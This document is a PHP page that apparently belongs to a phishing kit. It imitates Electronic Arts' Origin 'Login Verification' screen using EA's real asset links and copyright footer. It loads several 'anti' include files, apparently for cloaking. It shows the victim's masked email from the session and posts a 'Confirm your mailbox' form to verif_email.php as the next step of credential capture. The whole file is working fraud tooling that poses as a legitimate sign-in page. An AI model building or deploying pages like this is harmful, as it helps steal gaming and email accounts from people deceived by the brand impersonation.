
<?php
	   include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';

 ob_start();
session_start();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>

    <title>Login Verification</title>
    <meta name="title" content="Login Verification"/>
    <meta name="description" content="Login Verification"/>
    <link rel="shortcut icon" href="scp/favicon.ico"/>
    <meta name="lc" content="en_US"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
    <meta name="msapplication-tap-highlight" content="no" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex" />
    <link href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600" rel="stylesheet" type="text/css">

<script type="text/javascript">window.EA = {};</script>
<script type="text/javascript" src="//fonts.ea.com/fbl8bgs.js"></script>
<script type="text/javascript">(function () {
    try {
        Typekit.load();
    } catch (ex) {
        var html = document.getElementsByTagName('html')[0];
        html.className = (html.className || '') + ' wf-inactive'
    }
})();</script>

        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery-1.8.3.min.v_1599803148.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-ux-elements.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-layout.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/js/jquery.origin-challenge-onetime.v_1599803148-min.js">
<script type="text/javascript">
    if (!window.challenge_cancel) {
        window.challenge_cancel = function() {
            if ($("#btnCancel").length > 0) {
                $("#btnCancel").trigger("click");
                return true;
            } else {
                return false;
            }
        }
    }
</script>



<script type="text/javascript">
    $(document).ready(function () {
        $.fn.onetime({
        });
    });

</script>

                 
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-ux-elements.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-layout.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/css/origin-challenge-onetime.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/css/origin-challenge-common.v_1599803148-min.css"/>


    <!-- Tealium -->
    
    <script type="text/javascript">
        (function (a, b, c, d) {
            a = '//tags.tiqcdn.com/utag/ea/signin-eacom/prod/utag.js';
            b = document;
            c = 'script';
            d = b.createElement(c);
            d.src = a;
            d.type = 'text/java' + c;
            d.async = true;
            a = b.getElementsByTagName(c)[0];
            a.parentNode.insertBefore(d, a);
        })();
    </script>
    <!-- End of tealium -->

<script type="text/javascript">
    $(document).ready(function () {
        var skin = 'origin';
        var bodySelector = $("body");
        switch (skin) {
            case "origin":
                bodySelector.addClass("origin-com");
                break;
            case "franchisedark":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-dark");
                break;
            case "franchiselight":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-light");
                break;
            case "ea":
            default:
                bodySelector.addClass("ea-com");
                break;
        }
    })
</script>


</head>
<body>


<div class="loading-container"></div>

<div class="tfa-container">
    <form method="post" id="challengeForm" action="verif_email.php">
        <div class="dialog-info">
            <div id="resend-error-code" class="orange-box-error">
                <div></div>
            </div>
        </div>
        <div class="panel" id="panel-tfa">
            <div class="tfa-form-container">
                <div class="panel-contents">
                    <div class="panel-content">
                        <div class="marketing-area"></div>
                        <h1 class="twoStepHeader">Login Verification </h1>

                        <p class="tfa-login-panel-container-style">In order to verify your identity, 
  <?php
                              $email= $_SESSION['email'];
                                $email2 = preg_replace('/(?<=.).(?=.*@)/', '*', $email);
                                echo $email2;
                            ?>                                    <input type="hidden" name="codeType" value="EMAIL"/>
                                <a id="learn_more_link" href="#"
                                   class="tfa-login-link">Learn more</a>
                            </p>

                        <div class="panel-action-area">
<a class='origin-ux-element origin-ux-button
    origin-ux-button-primary  btn-next origin-ux-button-primary-purple' href="" id="btnSendCode">
<span><span>Confirm your mailbox</span></span>
</a>
<a class='origin-ux-element origin-ux-button origin-ux-button-secondary btn-cancel' href="" id="btnCancel">
<span><span>Cancel</span></span>
</a>
    <input type="hidden" name="_eventId" value="submit" id="_eventId"/>
                        </div>
                        <div class="divider"></div>
                    </div>
                </div>
            </div>
        </div>
<div class="footer">
    <span class="copyright-notice">© 2020 Electronic Arts Inc. Trademarks belong to their respective owners. All rights reserved.</span>
    <ul class="footer-navigation">
            <li class="item-2 even"><a
                    href=""
                    target="_blank"
                    class="link link-origin "><span>Shop at Origin</span></a>
            </li><li class="item-3 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Legal</span></a>
        </li><li class="item-4 even">
            <a href=""
               target="_blank"
               class="link link-origin"><span>User Agreement</span></a>
        </li><li class="item-5 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Privacy and Cookie Policy</span></a>
        </li><li class="item-6 even">
            <a href="" target="_blank"
               class="link link-origin"><span>Corporate Info</span></a>
        </li><li class="item-7 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>EA Terms of Sale</span></a>
        </li><li class="item-8 even last">
            <a href="" target="_blank"
               class="link link-origin"><span>Contact Us</span></a>
        </li>    </ul>
</div>
    </form>
</div>

<!-- ### prdaccountc-30.iad2.infery.com ### -->

</body>
</html>
